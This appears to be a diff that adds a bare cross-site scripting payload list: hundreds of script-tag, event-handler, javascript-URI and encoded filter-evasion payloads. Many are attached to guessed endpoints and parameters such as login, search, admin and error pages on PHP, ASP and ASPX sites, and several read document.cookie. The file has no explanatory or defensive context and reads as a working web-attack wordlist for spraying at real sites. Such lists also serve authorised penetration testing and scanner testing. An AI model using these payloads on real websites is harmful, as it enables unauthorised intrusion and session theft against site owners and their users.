@@ -1,0 +1,336 @@
+1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
+"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
+#"><svg onload=alert(1)>
+"><svg onload=alert(1)>
+嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E
+<img src=1 onerror=alert(1)>
+<img/src=a onerror="window['alert'](document.cookie)"/>
+<input type="text" value="javascript:alert('XSS')">
+<form action="javascript:alert('XSS')">
+javascript:/*/*/**/**/**/*%0D%0A%0d%0a*//**/oNclick-alert())//</style/</title/</textarEa/</script/->\x3ciframe/<iframe/oNloAd-alert(1)//>\x3e
+javascript://'/</title></style></textarea></script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+`javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert(123)//>/alert()/
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
+--><svg onload=alert(1)>
+"><script>alert(1)</script>
+aaaaa\”-confirm`1`//
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+#prettyPhoto%3Cimg%20src=x%20onerror=prompt(document.cookie)%3E;//
+!');script(2);//?aspxerrorpath=/MDMServiceConfig <img src=1 onerror=alert(1)>
+//?aspxerrorpath=/MDMServiceConfig <img src=1 onerror=alert(1)>
+?aspxerrorpath=/MDMServiceConfig <img src=1 onerror=alert(1)>
+BadRequest.html/?aspxerrorpath=<script>alert(2);</script>
+BadRequest.html!');script(2);//?aspxerrorpath=/MDMServiceConfig <img src=1 onerror=alert(1)>
+BadRequest.html!');script(2);//?aspxerrorpath=/MDMServiceConfig%20 <img src=1 onerror=alert(1)>
+"><img src=x onerror=alert(document.domain)>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+<body onload=alert(“bingo”)>
+<Script>alert()</Script>
+"><script>alert(123)</script>
+'><script>alert(123)</script>
+%20<script>alert(1)</script>
+%E5%98%8D%E5%98%8A%20<script>alert(1)</script>
+%0d%0a%20<script>alert(1)</script>
+%3F%20<script>alert(1)</script>
+%20"><svg onload=alert(1)>
+%E5%98%8D%E5%98%8A%20"><svg onload=alert(1)>
+%3F%20"><svg onload=alert(1)>
+%20<img src=1 onerror=alert(1)>
+%0d%0a%20<img src=1 onerror=alert(1)>
+%3F%20<img src=1 onerror=alert(1)>
+%0d%0a%20javascript:alert(1)
+%3F%20javascript:alert(1)
+%20"><img src=q onerror=alert(1)>
+"><img src=x onerror=prompt(document.domain);>
+%E5%98%8D%E5%98%8A%20"><img src=x onerror=prompt(document.domain);>
+%0d%0a%20"><img src=x onerror=prompt(document.domain);>
+%3F%20"><img src=x onerror=prompt(document.domain);>
+%E5%98%8D%E5%98%8A%20<script>prompt(document.domain)</script>
+%20<img/src/onerror=alert(ibro`)>
+%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(ibro`)>
+%0d%0a%20<img/src/onerror=alert(ibro`)>
+%3F%20<img/src/onerror=alert(ibro`)>
+%3F%20<body onload=alert("bingo")>
+--><script>alert(123)</script>
+;alert(123);
+"><script>alert(123);</script x='
+'`"><\x3Cscript>javascript:alert(1)</script>     
+"><body onload=alert(1)>
+"><input type="text" autofocus onfocus="alert(1)">
+/><svg src=x onload=confirm(document.domain);>	
+</b><script>alert(document.cookie)</script><b><!--	
+嘾嘾<script>alert(2);</script>	
+%E5%98%8D%E5%98%8A%20<script>alert(1)</script>	
+<svg on onload=(alert)(document.domain)>	
+"/><script>+-+-1-+-+confirm(1)</script>	
+%3E'><script>alert(2);</script>	
+%0d%0a%20<script>alert(1)</script>	
+"/><svg/onload=prompt(1)>	
+<!--><svg onload=alert(1)-->.html	
+"><svg onload=prompt(document.domain);>.asp
+"><svg onload=prompt(document.domain);>.aspx
+"><svg onload=prompt(document.domain);>.php
+"><svg onload=prompt(document.domain);>.html
+<!--><svg onload=alert(1)-->.asp
+<!--><svg onload=alert(1)-->.aspx
+<!--><svg onload=alert(1)-->.php
+<!--><svg onload=alert(1)-->.html
+"><img src=x onerror=prompt('document.domain');>.asp
+"><img src=x onerror=prompt('document.domain');>.aspx
+"><img src=x onerror=prompt('document.domain');>.php
+"><img src=x onerror=prompt('document.domain');>.html
+"><img src=x onerror=prompt('document.domain');>.htm
+<script>alert(1)</script>.asp
+<script>alert(1)</script>.aspx
+<script>alert(1)</script>.php
+<script>alert(1)</script>.html
+<script>alert(1)</script>.htm
+--><svg onload=alert(1)>
+%20"><img src=q onerror=alert(1)>	
+%22%3E%3Cimg%09src%3Dx%09onerror%3Dprompt(document.domain);%3E
+%20<script>alert(1)</script>	
+>'"><script>alert(2);</script>	
+%0d%0a%0d%0a<script>alert(document.domain)</script>	
+%22%27%3E'><script>alert(2);</script>	
+%22%3E'><script>alert(2);</script>	
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>	
+'%27%3E%27%22%3E%3Cscript%3Ealert(2);%3C/script%3E'
+'\u003E'\u0022><script>alert(2);</script>
+'>'\n><script>alert(2);</script>
+'>&lt;/b&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;b&gt;&lt;!--
+');alert(document.cookie)();//
+"><iframe onload=alert(1);>
+"><audio onplay=alert(1);>
+"><img src="javascript:alert(1);" />
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert
+%3Csvg%2Fonload%3Dalert%281%29%3E
+<svg/onload=alert(1)>
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+">\<img src=x onerror=prompt(document.domain);\>\;\>\<\>"
+>'>"><script>alert();</script>
+>'>"><svg/onload=alert(document.domain)>
+javascript:alert(1);///// 
+"><img src=x onerror='alert(document.domain)'>
+'"/><img src= x onerror='alert(document.domain)'>
+\"-alert(1)}//
+q=javascript:alert(document.domain)
+search?q=javascript:alert(document.domain)
+<sCript>confirm()</sCript>
+//j\\javascript:alert(document.domain)
+<p><img/src/onerror=alert(`ibro`)></p>
+嘼img src=1 onerror=alert(1)嘾
+嘾嘾<script>alert(2);</script>
+</b><script>alert(document.cookie)</script><b><!--
+d1bvs</script><script>alert(`XSS`)</script>c579g
+<svg></p><style><g title="</style><img src onerror=alert(document.domain)>">
+"/>"/><img src=xss onerror=alert(2)>
+/><svg src=x onload=confirm(document.domain);>
+</h1><script>alert(1)</script><h1>
+x"><svg%0Donload="window['alert'](document.cookie)">
+x'><svg%0Donload='window["alert"](document.cookie)'>
+x"><svg%0Donload="window['alert']((document)['cookie'])">
+<<SCRIPT>alert(1);//<</SCRIPT>
+<--`<img/src=` onerror=confirm(1)> --!>
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+%3cscript%3ealert()%3c/script>
+<iframe src=javascript:alert(1)> 
+""><img src=y onerror=confirm(1)>
+'><img src=y onerror=confirm(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+login.jsp?SPID="><img%20src=x%20onerror="alert(XXS)"
+?query=<img/src/onerror=alert(`ibro`)>
+?query="><img src=x onerror=prompt(document.domain);>
+en-us/Search#/?search="><img src=x onerror=prompt(document.domain);>
+search?q=<img/src/onerror=alert(`ibro`)>
+Search/Results?q=<img/src/onerror=alert(`ibro`)>
+Search/Results?q="><img src=x onerror=prompt(document.domain);>
+redirect?url=javascript://%250Aalert(document.domain)
+redirect.asp?url=javascript://%250Aalert(document.domain)
+redirect.aspx?url=javascript://%250Aalert(document.domain)
+q=javascript:alert(document.domain)
+guest/msft_a_guest_register.php?_browser=1&title="><svg/onload=alert(1)>
+(A("onerror='alert`1`'testabcd))/
+onerror="alert('XSS')"
+pods/ppt.aspx?&fileName=')}, 1000); alert('xss')://
+')}, 1000); alert('xss')://
+foo?q=foo<script>alert('xss')<%2fscript>
+Login.aspx?username=<img/src/onerror=alert(ibro)>
+Login.aspx?username=<img/src/onerror=alert(ibro)>
+Register.aspx?email=<img/src/onerror=alert(ibro)>
+ForgotPassword.aspx?email=<img/src/onerror=alert(ibro)>
+UserProfile.aspx?userid=<img/src/onerror=alert(ibro)>
+Search.aspx?query=<img/src/onerror=alert(ibro)>
+Contact.aspx?message=<img/src/onerror=alert(ibro)>
+Feedback.aspx?comment=<img/src/onerror=alert(ibro)>
+ProductDetail.aspx?productid=<img/src/onerror=alert(ibro)>
+Cart.aspx?item=<img/src/onerror=alert(ibro)>
+Checkout.aspx?order=<img/src/onerror=alert(ibro)>
+Error.aspx?message=<img/src/onerror=alert(ibro)>
+Admin/?action=<img/src/onerror=alert(ibro)>
+Login.asp?username=<img/src/onerror=alert(ibro)>
+Register.asp?email=<img/src/onerror=alert(ibro)>
+ForgotPassword.asp?email=<img/src/onerror=alert(ibro)>
+UserProfile.asp?userid=<img/src/onerror=alert(ibro)>
+Search.asp?query=<img/src/onerror=alert(ibro)>
+Contact.asp?message=<img/src/onerror=alert(ibro)>
+Feedback.asp?comment=<img/src/onerror=alert(ibro)>
+ProductDetail.asp?productid=<img/src/onerror=alert(ibro)>
+Cart.asp?item=<img/src/onerror=alert(ibro)>
+Checkout.asp?order=<img/src/onerror=alert(ibro)>
+Error.asp?message=<img/src/onerror=alert(ibro)>
+Admin/?action=<img/src/onerror=alert(ibro)>
+Login.php?username=<img/src/onerror=alert(ibro)>
+Register.php?email=<img/src/onerror=alert(ibro)>
+ForgotPassword.php?email=<img/src/onerror=alert(ibro)>
+UserProfile.php?userid=<img/src/onerror=alert(ibro)>
+Search.php?query=<img/src/onerror=alert(ibro)>
+Contact.php?message=<img/src/onerror=alert(ibro)>
+Feedback.php?comment=<img/src/onerror=alert(ibro)>
+Cart.php?item=<img/src/onerror=alert(ibro)>
+Checkout.php?order=<img/src/onerror=alert(ibro)>
+Error.php?message=<img/src/onerror=alert(ibro)>
+index.php?id="><img src=x onerror=prompt(document.domain);>
+login.php?username="><img src=x onerror=prompt(document.domain);>
+register.php?email="><img src=x onerror=prompt(document.domain);>
+dashboard.php?user="><img src=x onerror=prompt(document.domain);>
+profile.php?userid="><img src=x onerror=prompt(document.domain);>
+search.php?query="><img src=x onerror=prompt(document.domain);>
+admin/index.php?user="><img src=x onerror=prompt(document.domain);>
+admin/login.php?returnUrl="><img src=x onerror=prompt(document.domain);>
+admin/dashboard.php?admin="><img src=x onerror=prompt(document.domain);>
+admin/profile.php?user="><img src=x onerror=prompt(document.domain);>
+admin/settings.php?userid="><img src=x onerror=prompt(document.domain);>
+user/profile.php?id="><img src=x onerror=prompt(document.domain);>
+user/settings.php?user="><img src=x onerror=prompt(document.domain);>
+forum/index.php?topic="><img src=x onerror=prompt(document.domain);>
+forum/topic.php?id="><img src=x onerror=prompt(document.domain);>
+forum/post.php?replyTo="><img src=x onerror=prompt(document.domain);>
+blog/index.php?category="><img src=x onerror=prompt(document.domain);>
+blog/post.php?title="><img src=x onerror=prompt(document.domain);>
+contact.php?name="><img src=x onerror=prompt(document.domain);>
+page.php?page="><img src=x onerror=prompt(document.domain);>
+Admin/?action=<img/src/onerror=alert(ibro)>
+Pages/RsponePage.aspx?themecolor=%22-alert(XSS)-%22
+Pages/RsponePage.aspx?themecolor=%22-alert(%27XSS%27)-%22
+en-us/search?q=<img/src/onerror=alert('ibro')>
+en-us/search?q="><img src=x onerror=prompt(document.domain);>
+search?q="><img src=x onerror=prompt(document.domain);>
+search?q=<img/src/onerror=alert('ibro')>
+s="><img src=x onerror=prompt(document.domain);>
+s=<img/src/onerror=alert('ibro')>
+q="><img src=x onerror=prompt(document.domain);>
+q=<img/src/onerror=alert('ibro')>
+find?q=<img/src/onerror=alert('ibro')>
+result?q=<img/src/onerror=alert('ibro')>
+query?q="><img src=x onerror=prompt(document.domain);>
+query?q=<img/src/onerror=alert('ibro')>
+search?term="><img src=x onerror=prompt(document.domain);>
+search?term=<img/src/onerror=alert('ibro')>
+search?query="><img src=x onerror=prompt(document.domain);>
+search?query=<img/src/onerror=alert('ibro')>
+search?keywords="><img src=x onerror=prompt(document.domain);>
+search?keywords=<img/src/onerror=alert('ibro')>
+search?text="><img src=x onerror=prompt(document.domain);>
+search?text=<img/src/onerror=alert('ibro')>
+search?word=<img/src/onerror=alert('ibro')>
+search?word="><img src=x onerror=prompt(document.domain);>
+find?query=<img/src/onerror=alert('ibro')>
+find?query="><img src=x onerror=prompt(document.domain);>
+result?query=<img/src/onerror=alert('ibro')>
+result?query="><img src=x onerror=prompt(document.domain);>
+search?input=<img/src/onerror=alert('ibro')>
+search?input="><img src=x onerror=prompt(document.domain);>
+search-results?q=<img/src/onerror=alert('ibro')>
+search-results?q="><img src=x onerror=prompt(document.domain);>
+search?keyword=<img/src/onerror=alert('ibro')>
+search-results?query=<img/src/onerror=alert('ibro')>
+search-results?q=<img/src/onerror=alert('ibro')>
+results?query=<img/src/onerror=alert('ibro')>
+results?q=<img/src/onerror=alert('ibro')>
+search?search=<img/src/onerror=alert('ibro')>
+search?term=<img/src/onerror=alert('ibro')>
+search?searchTerm=<img/src/onerror=alert('ibro')>
+search?searchQuery=<img/src/onerror=alert('ibro')>
+search?searchKeyword=<img/src/onerror=alert('ibro')>
+search.php?q="><img src=x onerror=prompt(document.domain);>
+search.php?q=<img/src/onerror=alert('ibro')>
+search/?query=<img/src/onerror=alert('ibro')>
+search/?q=<img/src/onerror=alert('ibro')>
+search/?search=<img/src/onerror=alert('ibro')>
+search/?s=<img/src/onerror=alert('ibro')>
+search.aspx?q="><img src=x onerror=prompt(document.domain);>
+search.aspx?q=<img/src/onerror=alert('ibro')>
+search.aspx?query=<img/src/onerror=alert('ibro')>
+search.aspx?query="><img src=x onerror=prompt(document.domain);>
+search.aspx?search=<img/src/onerror=alert('ibro')>
+search.asp?q=<img/src/onerror=alert('ibro')>
+search.asp?query=<img/src/onerror=alert('ibro')>
+search.asp?search=<img/src/onerror=alert('ibro')>
+index.asp?id="><img src=x onerror=prompt(document.domain);>
+login.asp?username="><img src=x onerror=prompt(document.domain);>
+register.asp?email="><img src=x onerror=prompt(document.domain);>
+dashboard.asp?user="><img src=x onerror=prompt(document.domain);>
+profile.asp?userid="><img src=x onerror=prompt(document.domain);>
+search.asp?query="><img src=x onerror=prompt(document.domain);>
+admin/index.asp?user="><img src=x onerror=prompt(document.domain);>
+admin/login.asp?returnUrl="><img src=x onerror=prompt(document.domain);>
+admin/dashboard.asp?admin="><img src=x onerror=prompt(document.domain);>
+admin/profile.asp?user="><img src=x onerror=prompt(document.domain);>
+blog/search/?query=<img/src/onerror=alert('ibro')>
+search/?q=<img/src/onerror=alert('ibro')>
+search/?q="><img src=x onerror=prompt(document.domain);>
+search/?query=<img/src/onerror=alert('ibro')>
+find?q=<img/src/onerror=alert('ibro')>
+find?query=<img/src/onerror=alert('ibro')>
+results?q=<img/src/onerror=alert('ibro')>
+results?query=<img/src/onerror=alert('ibro')>
+pages/responsepage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/homepage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/loginpage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/profilepage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/productpage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/aboutpage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/contactpage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/gallery.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/registerpage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/checkoutpage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+pages/searchpage.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+index.aspx?id="><img src=x onerror=prompt(document.domain);>
+login.aspx?username="><img src=x onerror=prompt(document.domain);>
+dashboard.aspx?user="><img src=x onerror=prompt(document.domain);>
+profile.aspx?userid="><img src=x onerror=prompt(document.domain);>
+search.aspx?query="><img src=x onerror=prompt(document.domain);>
+admin/index.aspx?user="><img src=x onerror=prompt(document.domain);>
+admin/login.aspx?returnUrl="><img src=x onerror=prompt(document.domain);>
+admin/dashboard.aspx?admin="><img src=x onerror=prompt(document.domain);>
+admin/profile.aspx?user="><img src=x onerror=prompt(document.domain);>
+pages/events.aspx?id=d1bvs</script><script>alert(`XSS`)</script>c579g
+404.aspx?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+error.aspx?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+notfound.aspx?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+errorpage.aspx?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.aspx?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+404.asp?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.asp?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+404.html?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+error.html?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+notfound.html?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+errorpage.html?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/ErrorPage%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/NotFound%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/Error%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/ErrorPage.aspx%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/NotFound.aspx%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/Error.aspx%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/ErrorPage.asp%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/NotFound.asp%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/Error.asp%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/ErrorPage.html%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/NotFound.html%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?aspxerrorpath=/Error.html%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html!');script(2);//?aspxerrorpath=/MDMServiceConfig%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
+BadRequest.html?%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E 
